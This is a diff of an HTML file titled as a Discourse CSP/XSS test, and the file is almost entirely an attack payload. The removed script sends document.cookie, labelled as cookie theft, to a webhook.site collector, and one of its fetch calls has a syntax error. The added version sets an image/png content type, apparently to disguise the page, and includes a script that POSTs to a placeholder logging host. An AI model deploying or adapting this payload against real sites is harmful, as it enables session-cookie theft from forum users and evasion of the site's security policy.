@@ -1,21 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Discourse CSP/XSS Test</title>
-  <script>
-    // Notify your listener
-    fetch("https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3";
-
-    // Display clear test success
-    alert("✅ Test script executed!");
-    
-    // Steal a test cookie (if injected in a vulnerable page)
-    if (document.cookie) {
-      fetch("https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3?cookie=" + encodeURIComponent(document.cookie));
-    }
-  </script>
+  <meta http-equiv="Content-Type" content="image/png">
 </head>
 <body>
-  <h1>Test executed</h1>
+  <script>
+    fetch("https://your-logging-endpoint.com/webhook", {
+      method: "POST",
+      body: JSON.stringify({ message: "Webhook triggered!" }),
+      headers: { "Content-Type": "application/json" }
+    });
+  </script>
 </body>
 </html>
